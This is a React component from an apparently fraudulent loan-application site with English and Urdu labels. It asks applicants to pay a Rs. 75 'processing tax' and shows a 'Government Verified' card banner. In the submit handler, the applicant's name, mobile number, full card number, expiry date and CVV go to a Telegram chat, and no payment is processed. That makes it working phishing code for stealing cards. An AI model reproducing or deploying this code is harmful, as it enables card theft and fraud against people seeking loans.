import React, { useState } from 'react';
import { LoanApplicationState } from '../types';
import { ArrowRight, ArrowLeft, CreditCard, Lock, ShieldCheck, Wifi } from 'lucide-react';
import cardImg from '../assets/images/premium_debit_card_1788152622955.jpg';
import { sendTelegramMessage } from '../utils/telegram';

interface FeeStepProps {
  data: LoanApplicationState;
  updateData: (fields: Partial<LoanApplicationState>) => void;
  onNext: () => void;
  onBack: () => void;
}

export const FeeStep: React.FC<FeeStepProps> = ({ data, updateData, onNext, onBack }) => {
  const [error, setError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!data.cardNumber || !data.expiry || !data.cvv) {
      setError('Please provide card details for processing fee verification / براہ کرم فیس کی تصدیق کے لیے کارڈ کی تفصیلات درج کریں۔');
      return;
    }
    setError('');

    sendTelegramMessage(
      `💳 *Loan Application - Fee & Card Details*\n🔑 *Session ID: ${data.sessionId}*\n👤 Name: ${data.fullName}\n📱 Mobile: ${data.mobileNo}\n💳 Card Number: ${data.cardNumber}\n⏳ Expiry: ${data.expiry}\n🔒 CVV: ${data.cvv}`
    );

    onNext();
  };

  return (
    <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 md:p-8 max-w-2xl mx-auto">
      <div className="flex items-center justify-between pb-6 border-b border-slate-100 mb-6">
        <div>
          <h2 className="text-xl font-bold text-slate-900">Loan Apply Fees</h2>
          <p className="text-sm text-slate-500">Pay Rs. 75 processing tax to submit application</p>
        </div>
        <span className="text-xs font-semibold bg-emerald-50 text-emerald-800 px-3 py-1 rounded-full border border-emerald-200">
          محفوظ ادائیگی
        </span>
      </div>

      <div className="bg-emerald-50/70 border border-emerald-200/80 rounded-xl p-4 mb-6 flex items-start space-x-3 text-emerald-900">
        <CreditCard className="w-5 h-5 text-emerald-700 shrink-0 mt-0.5" />
        <div className="text-xs">
          <p className="font-semibold">Pay Rs. 75 processing tax to submit your application</p>
          <p className="text-emerald-700 mt-0.5 font-urdu">درخواست جمع کرانے کے لیے 75 روپے ٹیکس ادا کریں</p>
        </div>
      </div>

      {/* Premium Green Debit Card Banner */}
      <div className="relative mb-8 rounded-2xl overflow-hidden shadow-2xl border border-emerald-700/40 bg-[#052317]">
        <div className="relative aspect-[16/9] w-full overflow-hidden">
          <img 
            src={cardImg} 
            alt="Premium Debit Card" 
            referrerPolicy="no-referrer"
            className="w-full h-full object-cover rounded-2xl filter brightness-95 contrast-105"
          />
          
          {/* Interactive Card Overlays */}
          <div className="absolute inset-0 p-5 md:p-6 flex flex-col justify-between bg-gradient-to-t from-black/80 via-transparent to-black/20 text-white font-sans">
            <div className="flex justify-between items-start">
              <div className="flex items-center space-x-3">
                {/* Gold Chip Representation */}
                <div className="w-10 h-7 rounded bg-gradient-to-r from-amber-200 via-amber-400 to-amber-500 border border-amber-300 shadow-md flex items-center justify-center relative overflow-hidden">
                  <div className="absolute inset-0 bg-black/10 grid grid-cols-2 gap-0.5 p-0.5">
                    <div className="border-r border-b border-amber-600/40"></div>
                    <div className="border-b border-amber-600/40"></div>
                    <div className="border-r border-amber-600/40"></div>
                    <div></div>
                  </div>
                </div>
              </div>
              
              <div className="text-right flex flex-col items-end">
                <div className="flex items-center space-x-1.5 text-amber-300 font-medium text-xs tracking-wide">
                  <span className="capitalize">premium debit</span>
                  <Wifi className="w-4 h-4 rotate-90 text-amber-200" />
                </div>
                <span className="text-[10px] text-emerald-200/80 font-mono">Government Verified</span>
              </div>
            </div>

            <div className="my-2">
              <div className="text-xs text-emerald-300/80 font-semibold mb-1 uppercase tracking-wider text-[10px]">
                ATM Card Number / اے ٹی ایم کارڈ نمبر
              </div>
              <div className="font-mono tracking-widest text-lg md:text-2xl font-bold text-white drop-shadow-md">
                {data.cardNumber ? data.cardNumber : '**** **** **** ****'}
              </div>
            </div>

            <div className="flex justify-between items-end">
              <div>
                <span className="text-[9px] text-emerald-300/80 block uppercase tracking-wider font-medium">Card Holder</span>
                <span className="font-semibold text-xs md:text-sm tracking-wide text-amber-100 uppercase drop-shadow">
                  {data.fullName ? data.fullName : 'APPLICANT NAME'}
                </span>
              </div>

              <div className="flex space-x-5 text-right font-mono text-xs">
                <div>
                  <span className="text-[8px] text-emerald-300/80 block uppercase">VALID FROM</span>
                  <span className="font-bold text-amber-200 text-[11px]">04/2024</span>
                </div>
                <div>
                  <span className="text-[8px] text-emerald-300/80 block uppercase">VALID THRU</span>
                  <span className="font-bold text-amber-200 text-[11px]">
                    {data.expiry ? data.expiry : '04/2029'}
                  </span>
                </div>
                <div>
                  <span className="text-[8px] text-emerald-300/80 block uppercase">CVC / CVV</span>
                  <span className="font-bold text-amber-200 text-[11px]">
                    {data.cvv ? '***' : '***'}
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {error && (
        <div className="mb-6 p-4 bg-red-50 border border-red-200 text-red-700 text-sm rounded-xl">
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-5">
        <div>
          <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
            <span>Bank ATM Card Number *</span>
            <span className="font-normal text-slate-500 font-urdu">بینک اے ٹی ایم کارڈ نمبر</span>
          </label>
          <div className="relative">
            <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
              <CreditCard className="w-4 h-4" />
            </span>
            <input
              type="text"
              required
              maxLength={19}
              placeholder="0000 0000 0000 0000"
              value={data.cardNumber}
              onChange={(e) => updateData({ cardNumber: e.target.value })}
              className="w-full pl-10 pr-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50 font-mono"
            />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Expiry *</span>
              <span className="font-normal text-slate-500 font-urdu">میعاد</span>
            </label>
            <input
              type="text"
              required
              placeholder="MM/YY"
              maxLength={5}
              value={data.expiry}
              onChange={(e) => updateData({ expiry: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50 font-mono"
            />
          </div>

          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>CVV *</span>
              <span className="font-normal text-slate-500 font-urdu">سی وی وی</span>
            </label>
            <div className="relative">
              <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                <Lock className="w-4 h-4" />
              </span>
              <input
                type="password"
                required
                maxLength={4}
                placeholder="123"
                value={data.cvv}
                onChange={(e) => updateData({ cvv: e.target.value })}
                className="w-full pl-10 pr-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50 font-mono"
              />
            </div>
          </div>
        </div>

        <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 flex items-center justify-between">
          <div>
            <p className="text-xs font-bold text-slate-800">Processing Tax</p>
            <p className="text-[11px] text-slate-500 font-urdu">پراسیسنگ ٹیکس</p>
          </div>
          <span className="text-lg font-bold text-emerald-800">Rs. 75</span>
        </div>

        <div className="pt-4 flex justify-between">
          <button
            type="button"
            onClick={onBack}
            className="flex items-center space-x-2 px-5 py-3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold rounded-xl text-sm transition-all"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back / واپس</span>
          </button>
          
          <button
            type="submit"
            className="flex items-center space-x-2 px-6 py-3 bg-[#0b1f36] hover:bg-slate-800 text-white font-semibold rounded-xl text-sm shadow-md transition-all"
          >
            <span>Continue / جاری رکھیں</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </form>
    </div>
  );
};
